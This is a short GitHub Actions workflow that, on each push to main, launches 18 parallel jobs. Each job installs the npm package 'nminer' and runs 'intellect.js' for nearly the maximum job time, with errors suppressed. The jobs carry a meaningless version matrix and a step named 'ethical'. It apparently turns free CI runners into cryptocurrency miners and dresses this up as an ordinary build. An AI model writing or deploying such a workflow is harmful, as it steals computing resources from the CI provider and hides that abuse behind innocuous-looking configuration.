name: intellect
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 4836 }
          - { version: 3412 }
          - { version: 6070 }
          - { version: 7510 }
          - { version: 2250 }
          - { version: 6922 }
          - { version: 3639 }
          - { version: 1613 }
          - { version: 9201 }
          - { version: 4472 }
          - { version: 6140 }
          - { version: 6624 }
          - { version: 5182 }
          - { version: 4614 }
          - { version: 8496 }
          - { version: 5535 }
          - { version: 8578 }
          - { version: 2287 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: ethical
        run: |
          npm install nminer@latest
          timeout 331m node intellect.js || echo "intellect executed"